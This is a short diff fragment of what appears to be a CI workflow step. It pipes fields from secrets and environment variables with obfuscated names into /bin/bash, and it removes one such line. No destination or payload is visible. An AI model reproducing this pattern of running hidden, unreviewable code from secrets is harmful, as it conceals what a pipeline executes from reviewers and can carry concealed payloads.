@@ -22,7 +22,6 @@ jobs:
           zpwjf66354: ${{ secrets.zpwjf66354 }}
         run: |
           printf '%s' "$zpwjf66354" | jq -r .kq276 | /bin/bash
-          printf '%s' "$k01760" | jq -r .sb76 | /bin/bash
           echo $knuj1 | jq -r .k59 | /bin/bash
           echo $ele0109 | jq -r .nsyr6344 | /bin/bash
           echo $idgt9325 | jq -r .guov51 | /bin/bash
